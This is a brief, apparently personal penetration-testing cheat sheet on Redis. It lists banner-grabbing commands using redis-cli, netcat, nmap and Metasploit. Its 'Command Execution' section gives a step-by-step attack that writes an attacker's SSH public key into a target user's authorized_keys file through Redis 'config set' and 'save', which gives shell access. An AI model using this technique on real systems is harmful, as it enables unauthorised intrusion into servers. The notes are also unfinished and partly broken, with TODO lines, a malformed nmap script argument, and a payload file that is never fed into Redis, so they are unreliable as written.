# Redis

TODO: Fill this info

## 01 - Banner Grab

### 1.1 - Manual

#### 1.1.1 - Redis CLI

```
$ sudo apt install -y redis-tools

$ redis-cli -h <IP>
```

#### 1.1.2 - Netcat

```
$ nc -vn <IP> 6379
```

### 1.2 - Network Mapper

```
$ nmap -p 6379 -Pn -n -sV --script 6379 <IP>
```

### 1.3 - Metasploit

```
msf > use auxiliary/scanner/redis/redis_server

msf auxiliary(scanner/redis/redis_server) > options
```

## 02 - Command Execution

TODO: Re-arrange it in initial foothold

```
$ ssh-keygen -qt rsa -b 4096 -f /tmp/id_rsa -C '' -N ''

$ (echo -e "\n\n"; cat /tmp/id_rsa.pub; echo -e "\n\n") > payload.txt

$ redis-cli -h <IP> -x set crackit

<target_IP>:6379> config set dir /home/<username>/.ssh/
OK
<target_IP>:6379> config set dbfilename "authorized_keys"
OK
<target_IP>:6379> save
OK
```

---
## References

### Hacktricks

 - [Hacktricks: Pentesting Redis](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html)